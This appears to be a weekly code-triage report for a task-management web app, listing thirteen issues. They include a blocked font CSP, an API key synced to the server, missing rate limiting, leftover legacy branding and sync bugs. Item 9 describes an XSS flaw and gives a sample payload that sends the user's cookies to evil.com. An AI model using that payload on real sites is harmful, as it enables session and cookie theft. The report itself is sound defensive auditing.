# Weekly Triage — 2026-07-28

## 📊 Week at a glance
- Commits: **1** | Files changed: **3** | Debt markers added in changed files: **0**
- High-churn files: Only 1 commit this week; no churn pattern to report
- The week's only commit (b38d4bb) was clean — no debug artifacts, no TODO/FIXME in touched files
- Deeper analysis of the full codebase surfaced systemic issues not introduced this week (see IMPROVEMENT_PLAN.md)

---

## 🚨 Needs immediate attention

### 1. Google Fonts blocked by own CSP — Inter doesn't load for any user
- **File**: `vercel.json:15` + `index.html:14–16`
- **Commit that introduced**: CSP was in place before this week; font link has been in index.html since initial commits
- **Why this matters**: `style-src` only allows `'self'` and `'unsafe-inline'`; `fonts.googleapis.com` is not listed. The Inter stylesheet fails to load silently. Every user sees system fallback fonts — the app looks broken.
- **Fix**: Add `https://fonts.googleapis.com` to `style-src`, `https://fonts.gstatic.com` to `font-src` — or self-host Inter.

---

### 2. Claude API key is synced to Supabase server-side
- **File**: `index.html:9917`, `index.html:2517`
- **Commit that introduced**: The `claudeKey` field has been in `S` since early commits; sync was added later
- **Why this matters**: `S.claudeKey = k; save();` — `save()` both writes to localStorage AND schedules a Supabase sync. Users' personal `sk-ant-...` keys are stored in plaintext in the server database.
- **Fix**: Move `claudeKey` out of `S` into standalone `localStorage('taskos_api_key')`, matching the pattern used for `taskos_readwise_key`.

---

### 3. New users greeted as "Panos" with Panos's personal tasks
- **File**: `index.html:2519`, `index.html:4546–4629`
- **Commit that introduced**: Has been there since initial seeding; not addressed in rebrand commit #80
- **Why this matters**: Every new user sees "Good morning, Panos 👋" and starter tasks like "Greek Nonprofits Board (Make-A-Wish etc)". Kills the onboarding magic moment for any real user.
- **Fix**: Default `profileName` to `'friend'`; replace Givelink-specific seed tasks with generic ones.

---

### 4. `aiProxy` is empty — no AI features work for users without personal API keys
- **File**: `index.html:9959`
- **Commit that introduced**: Set as `''` in the APP_CONFIG setup block; never changed
- **Why this matters**: AI triage, day planning, Reply-to-Act are the headline features. They silently fail for any user who doesn't add their own Anthropic key. The serverless proxy at `api/claude.js` is ready and deployed but the URL is not wired up.
- **Fix**: Set `aiProxy` to the Vercel function URL; add rate limiting first (see item 5).

---

### 5. No rate limiting on `/api/claude` — cost runaway once proxy is enabled
- **File**: `api/claude.js:12`
- **Commit that introduced**: The comment "add per-user rate limiting" has been in the file since it was created
- **Why this matters**: Once `aiProxy` is wired up, any authenticated user can call Claude unlimited times. A single power-user or automation could generate hundreds of dollars in API costs.
- **Fix**: Integrate Upstash Redis rate limiting (50 req/user/day) before deploying the proxy publicly.

---

## 🧹 Cleanup opportunities

### 6. Givelink-specific schema and views still in user data
- **File**: `index.html:2517` (S state object), `index.html:2984` (view router includes `renderGivelinkDash`)
- **Commit**: Present since the Givelink-to-Arete rebrand commits; partially cleaned in #81
- **Why this matters**: Every user's localStorage/Supabase sync carries `givelinkMetrics`, `givelinkHistory`, `brandAuditResult`, `impactModel` etc. The `renderGivelinkDash` view is still in the router and accessible via nav.
- **Fix**: Strip Givelink-specific fields from `S`; gate `renderGivelinkDash` behind a private flag.

---

### 7. `/givelink` route still publicly accessible → old product page
- **File**: `vercel.json:4`
- **Commit**: Present since initial setup; not addressed in #80 rebrand
- **Why this matters**: Users landing at `/givelink` see a completely different blue-themed product ("Givelink — Sprint Board"). Brand confusion and a confusing dead end for anyone who has an old link.
- **Fix**: Either remove the rewrite and 301 to `/`, or move `givelink.html` to a private/password-protected path.

---

### 8. PostHog keys are empty — all analytics are no-ops
- **File**: `landing.html:700`, `index.html:9960`
- **Commit**: Analytics scaffolding added in b38d4bb (#83) but key was left blank as a placeholder
- **Why this matters**: The CTA-click, scroll-depth, demo-seen, and conversion tracking added in #83 fire zero events. The whole analytics investment is wasted until the key is pasted in.
- **Fix**: Create a PostHog project, paste the same key into both files.

---

### 9. XSS: `t.title` injected raw into `innerHTML` in weekly review wizard
- **File**: `index.html:3594`, `3601`, `3603`
- **Commit**: Has been in the wizard render code for several commits; not touched this week
- **Why this matters**: A task title like `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` would execute in the review wizard. Low probability for a solo user, higher if accounts are ever shared or the app becomes multi-user.
- **Fix**: Wrap `${t.title}` and `${g.title}` in `esc()` inside `renderWizPanel()`.

---

### 10. `sbConnect()` silent-falls-through: any error triggers signup
- **File**: `index.html:10038–10044`
- **Commit**: In the Supabase auth code since #79/80; not touched this week
- **Why this matters**: If login fails for any reason (server 500, network timeout), the code silently attempts to create a new account. An existing user hitting a transient error gets a confusing "confirm your email" message.
- **Fix**: Only fall through to signup on HTTP 400/422 (bad credentials); rethrow all other errors.

---

## 🤔 Worth a second look

### 11. Last-write-wins sync with no conflict notification
- **File**: `index.html:9940` (comment: "Last-write-wins by `S._updatedAt`")
- **Commit**: Core sync design; unchanged this week
- **Why this matters**: Two offline devices syncing in sequence silently discard the earlier one's changes. No toast, no merge, no warning. For a personal productivity app, silent data loss is a trust-killer.
- **Suggestion**: Show a toast when a remote state newer than local is applied. Long-term: per-task merge by ID rather than whole-blob replace.

---

### 12. `_sbApplying` flag not guarded with try/finally
- **File**: `index.html` — `sbSyncNow()` function (search `_sbApplying=true`)
- **Commit**: Sync logic; unchanged this week
- **Why this matters**: If the sync function throws while `_sbApplying=true`, the flag stays set. Subsequent `save()` calls skip `_sbScheduleSync()` (line 2586 guard: `if(!_sbApplying)`), meaning changes after a failed sync might never re-queue.
- **Suggestion**: Wrap the sync body in `try/finally { _sbApplying=false; }`.

---

### 13. `IntersectionObserver` in landing demo never disconnects
- **File**: `landing.html:687–692`
- **Commit**: Added in b38d4bb (this week's commit) — the only debt introduced this week
- **Why this matters**: The observer sets `seen=true` to prevent re-triggering but never calls `io.unobserve(wrap)`. Minor memory leak; one observer kept alive after it's done its job.
- **Suggestion**: Add `io.unobserve(wrap)` immediately after `loop()` is called.

---

_Triage covers commits from 2026-07-22 to 2026-07-28 (1 commit). Items 1–10 are pre-existing issues surfaced by deep scan; only item 13 was introduced by this week's commit. All items in §"Needs immediate attention" should be addressed before the next marketing push._
